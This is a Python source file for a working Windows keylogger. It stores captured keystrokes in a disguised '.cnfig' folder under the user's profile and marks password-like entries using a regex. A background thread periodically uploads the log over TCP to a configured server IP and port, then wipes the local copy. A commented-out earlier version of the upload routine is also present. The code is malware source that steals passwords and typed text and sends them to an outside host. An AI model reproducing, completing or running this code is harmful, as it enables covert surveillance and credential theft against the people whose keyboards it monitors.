import threading 
from functools import partial
from pynput import keyboard
from client import send_file_to_server
from key import SERVER_IP_ADDR,SERVER_PORT, TIME_INTERVAL
import os
import re
import socket
import time

def send_file_to_server(file_path, server_host, server_port, interval):
    """
    Sends a file to the server every specified interval.
    
    Args:
        file_path (str): Path to the file to be sent.
        server_host (str): Server IP address.
        server_port (int): Server port.
        interval (int): Time interval in seconds between consecutive transfers.
    """
    while True:  # Main loop
        try:
            # Skip sending if file doesn't exist or is empty
            if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
                print(f"File '{file_path}' is empty or doesn't exist. Waiting for next interval...")
                time.sleep(interval)
                continue
                
            print(f"Connecting to server at {server_host}:{server_port}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((server_host, server_port))
                print(f"Connected. Sending file: {file_path}")
                
                # Read and send file contents
                with open(file_path, 'r') as file:
                    file_contents = file.read()
                    if file_contents:  # Only send if there's content
                        client_socket.sendall(file_contents.encode('utf-8'))
                        client_socket.sendall(b"END")
                        print("File sent successfully.")
                        
                        # Wait for server acknowledgment
                        response = client_socket.recv(1024).decode('utf-8')
                        print(f"Server response: {response}")
                
                # Clear the file after successful send
                with open(file_path, 'w') as file:
                    pass
                    
        except Exception as e:
            print(f"An error occurred: {e}")
        
        print(f"Waiting {interval} seconds before next transfer...")
        time.sleep(interval)

'''
def send_file_to_server(file_path, server_host, server_port, interval):
    """
    Sends a file to the server every 600 seconds or 10 minutes.
    
    Args:
        file_path (str): Path to the file to be sent.
        server_host (str): Server IP address.
        server_port (int): Server port.
        interval (int): Time interval in seconds between consecutive transfers.
    """
    if not os.path.isfile(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        return
    
    while True:
        try:
            print(f"Connecting to server at {server_host}:{server_port}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((server_host, server_port))
                print(f"Connected. Sending file: {file_path}")
                
                with open(file_path, 'r') as file:
                    for line in file:
                        print(line)
                        client_socket.sendall(line.encode('utf-8'))
                
                # Send termination signal to indicate the end of the file
                client_socket.sendall(b"END")
                print("File sent successfully.")
                
                # Receive acknowledgment from the server
                response = client_socket.recv(1024).decode('utf-8')
                print(f"Server response: {response}")
        
        except Exception as e:
            print(f"An error occurred: {e}")
        
        print(f"Waiting {interval} seconds before the next transfer...")
        with open(file_path, 'w') as file:
            pass
        time.sleep(interval)

'''

stop_event = threading.Event()
filename = os.getlogin() + ".txt"
dirname = ".cnfig"
word = ""
stop_event = threading.Event()

def setupFiles(path):
    new_dir = os.path.join(path, dirname)
    
    if not os.path.exists(new_dir):
        os.makedirs(new_dir, exist_ok=True)
        print(f'Dir made: {new_dir}')
    
    file_dir = os.path.join(new_dir, filename)
    files = [f for f in os.listdir(new_dir)]
    
    if len(files) == 0:
        with open(file_dir, 'a') as file:
            pass
    
    return file_dir

def checkfile():
    try: 
        path = os.path.join("C:\\Users", os.getlogin())
        if os.path.exists(path):
            return setupFiles(path)
        else:
            raise Exception("Path does not exist")
    except Exception as e:
        return e

def check_pass(password) -> bool:
    pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
    match = re.match(pattern, password)
    return bool(match)

def keyPressedF(key, file_path):
    global word
    
    with open(file_path, 'a') as log_file:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char

            elif key == keyboard.Key.space:  # Space key
                log_file.write(word + " " + "\n")  # Add the current word to the buffer
                word = ""  # Reset the word

            elif key == keyboard.Key.enter:  # Enter key
                if check_pass(word):
                    word = "\u00BF" + word  # Mark password-like words
                log_file.write(word + "\n")
                word = ""  # Reset the word

            elif key == keyboard.Key.backspace:  # Backspace key
                word = word[:-1]  # Remove the last character from the current word

            elif key == keyboard.Key.delete:  # Delete key
                log_file.write("[DELETE]\n")

            elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
                log_file.write(f"[{key.name.upper()}]\n")  # Log the special key press

            elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
                log_file.write(f"[{key.name.upper()}]\n")

            else:
                log_file.write(f"[{key}]\n")  # Log any unhandled special key presses
        except Exception as e:
            print("Error:", e)

def keyboard_logger_pathed_without_timer(path):
    print(f"Keylogger running with PID: {os.getpid()}")
    keyPressed_with_path = partial(keyPressedF, file_path=path)

    listener = keyboard.Listener(on_press=keyPressed_with_path)
    listener.start()

    try:
        while True:  # Infinite loop to keep the thread running
            threading.Event().wait(0.1)
    except KeyboardInterrupt:
        listener.stop()



def run():
    store_file = checkfile()
    if isinstance(store_file, Exception):
        return
    print(store_file)
    # Start the keylogger thread
    t1 = threading.Thread(target=keyboard_logger_pathed_without_timer, name='logger', args=(store_file,))
    t1.daemon = True  # Allows the program to exit if the main thread exits
    t1.start()

    # Start the file upload thread
    t2 = threading.Thread(target=send_file_to_server, name='upload', args=(store_file, SERVER_IP_ADDR, SERVER_PORT, TIME_INTERVAL))
    t2.daemon = True
    t2.start()

    # Keep the main thread alive indefinitely
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Program terminated.")


if __name__ == "__main__":
    run()
